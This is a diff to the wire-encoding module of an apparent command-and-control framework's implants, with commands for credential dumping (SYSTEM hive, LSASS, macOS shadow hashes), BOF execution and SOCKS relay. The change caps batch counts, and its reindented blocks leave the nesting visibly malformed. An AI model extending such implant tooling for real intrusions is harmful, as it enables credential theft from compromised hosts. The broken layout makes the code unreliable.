@@ -142,8 +142,8 @@ pub enum Command {
     ///   - 1 = SYSTEM hive（Windows，boot-key 源）
     ///   - 2 = LSASS 内存 dump（预留；最响的 IOC，所有后端暂返回 deferred）
     ///   - 3 = macOS shadow hash（agent-dev，读 dslocal plist）
-    /// 数字 0/1 在 implant-win 上行为不变（旧 beacon 兼容）；agent-dev 的
-    /// method=1 从 shadow 改为 SYSTEM（macOS 返回 unsupported），shadow 挪到 3。
+    ///     数字 0/1 在 implant-win 上行为不变（旧 beacon 兼容）；agent-dev 的
+    ///     method=1 从 shadow 改为 SYSTEM（macOS 返回 unsupported），shadow 挪到 3。
     Hashdump { method: u8 },
     /// Write `data` to an open relay channel's socket — the operator→implant
     /// direction of the SOCKS / rportfwd relay. `chan` is the id a prior
@@ -243,15 +243,15 @@ impl Command {
                 w.str(path);
             }
             Command::Exit => w.u8(6),
-            Command::Bof { name, args, blob } => {
-                w.u8(7);
-                w.str(name);
-                w.u32(args.len() as u32);
-                for a in args {
-                    w.str(a);
-                }
-                w.blob(blob);
-            }
+    Command::Bof { name, args, blob } => {
+        w.u8(7);
+        w.str(name);
+        w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
+        for a in args.iter().take(MAX_WIRE_COUNT) {
+            w.str(a);
+        }
+        w.blob(blob);
+    }
             Command::Connect {
                 proto,
                 host,
@@ -557,14 +557,14 @@ impl Task {
     }
 
     /// Encode a batch: `u32 count` followed by each task.
-    pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
-        let mut w = Writer::new();
-        w.u32(tasks.len() as u32);
-        for t in tasks {
-            t.encode(&mut w);
-        }
-        w.into_bytes()
+pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
+    let mut w = Writer::new();
+    w.u32(tasks.len().min(MAX_WIRE_COUNT) as u32);
+    for t in tasks.iter().take(MAX_WIRE_COUNT) {
+        t.encode(&mut w);
     }
+    w.into_bytes()
+}
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<Task>, WireError> {
         let mut r = Reader::new(data);
@@ -598,14 +598,14 @@ impl TaskResponse {
         })
     }
 
-    pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
-        let mut w = Writer::new();
-        w.u32(rs.len() as u32);
-        for r in rs {
-            r.encode(&mut w);
-        }
-        w.into_bytes()
+pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
+    let mut w = Writer::new();
+    w.u32(rs.len().min(MAX_BATCH) as u32);
+    for r in rs.iter().take(MAX_BATCH) {
+        r.encode(&mut w);
     }
+    w.into_bytes()
+}
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<TaskResponse>, WireError> {
         let mut r = Reader::new(data);
